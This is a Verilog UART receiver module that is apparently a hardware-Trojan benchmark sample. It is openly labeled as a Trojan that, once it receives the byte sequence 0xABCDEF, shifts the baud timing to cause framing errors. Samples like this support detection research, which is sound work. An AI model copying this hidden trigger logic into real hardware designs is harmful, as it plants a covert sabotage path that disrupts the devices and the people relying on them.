// RS232-T200: Baud rate manipulation Trojan

module uart_rx_trojan(
    input clk,
    input rst,
    input rx,
    output reg [7:0] data_out,
    output reg rx_valid,
    output reg rx_error
);

    reg [3:0] bit_cnt;
    reg [7:0] shift_reg;
    reg [15:0] baud_cnt;
    reg receiving;

    // Trojan: manipulate baud rate on specific pattern
    reg [23:0] pattern_detect;
    wire mal_trigger = (pattern_detect == 24'hABCDEF);
    reg [15:0] Trojan_baud_modifier;

    parameter BAUD_DIV = 16'd868;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            data_out <= 8'b0;
            rx_valid <= 1'b0;
            rx_error <= 1'b0;
            bit_cnt <= 4'b0;
            shift_reg <= 8'b0;
            baud_cnt <= 16'b0;
            receiving <= 1'b0;
            pattern_detect <= 24'b0;
            Trojan_baud_modifier <= 16'b0;
        end else begin
            rx_valid <= 1'b0;

            if (!receiving && !rx) begin
                receiving <= 1'b1;
                bit_cnt <= 4'd8;
                baud_cnt <= (BAUD_DIV >> 1) + Trojan_baud_modifier;
            end else if (receiving) begin
                if (baud_cnt == 0) begin
                    baud_cnt <= BAUD_DIV + Trojan_baud_modifier;
                    if (bit_cnt > 0) begin
                        shift_reg <= {rx, shift_reg[7:1]};
                        bit_cnt <= bit_cnt - 1;
                    end else begin
                        receiving <= 1'b0;
                        data_out <= shift_reg;
                        rx_valid <= 1'b1;
                        pattern_detect <= {pattern_detect[15:0], shift_reg};

                        // Trojan: activate on pattern
                        if (mal_trigger) begin
                            Trojan_baud_modifier <= 16'd100;  // Cause framing errors
                        end
                    end
                end else begin
                    baud_cnt <= baud_cnt - 1;
                end
            end
        end
    end

endmodule
